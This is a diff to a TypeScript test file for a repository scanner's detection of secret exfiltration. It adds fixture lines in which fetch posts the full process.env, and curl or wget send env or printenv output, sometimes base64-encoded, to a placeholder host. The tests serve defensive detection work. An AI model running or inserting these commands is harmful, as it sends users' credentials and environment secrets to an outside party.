@@ -4,9 +4,9 @@ import { inspectRepository } from "./bounded-scan";
 const enc = (text: string) => new TextEncoder().encode(text);
 
 function categories(path: string, text: string): string[] {
-  return inspectRepository({ files: [{ path, bytes: enc(text) }] }).findings.map(
-    (finding) => finding.category,
-  );
+  return inspectRepository({
+    files: [{ path, bytes: enc(text) }],
+  }).findings.map((finding) => finding.category);
 }
 
 /**
@@ -15,19 +15,25 @@ function categories(path: string, text: string): string[] {
  * that prints it, and the same substitution posted by wget.
  */
 test("a whole environment spread into a JSON body is serialized", () => {
-  expect(
-    categories(
-      "install.mjs",
-      'await fetch(URL, { method: "POST", body: JSON.stringify({ ...process.env }) });\n',
-    ),
-  ).toContain("secret-exfiltration");
+  for (const text of [
+    'await fetch(URL, { method: "POST", body: JSON.stringify({ ...process.env }) });\n',
+    "await fetch(URL, { body: JSON.stringify({ ...process.env, EXTRA: 1 }) });\n",
+    "await fetch(URL, { body: JSON.stringify({ EXTRA: 1, ...process.env }) });\n",
+    'await fetch(URL, { body: JSON.stringify(process["env"]) });\n',
+  ])
+    expect({ text, categories: categories("install.mjs", text) }).toEqual({
+      text,
+      categories: expect.arrayContaining(["secret-exfiltration"]),
+    });
 });
 
 test("a command substitution that prints the environment is serialized", () => {
   for (const line of [
     'curl -sS -d "$(env)" https://x.example/i\n',
-    "curl --data-binary \"$(printenv)\" https://x.example/i\n",
+    'curl --data-binary "$(printenv)" https://x.example/i\n',
     'wget -qO- --post-data="$(env)" https://x.example/i\n',
+    'curl -d "$(env | base64)" https://x.example/i\n',
+    'curl -d "`env`" https://x.example/i\n',
   ])
     expect({ line, categories: categories("install.sh", line) }).toEqual({
       line,
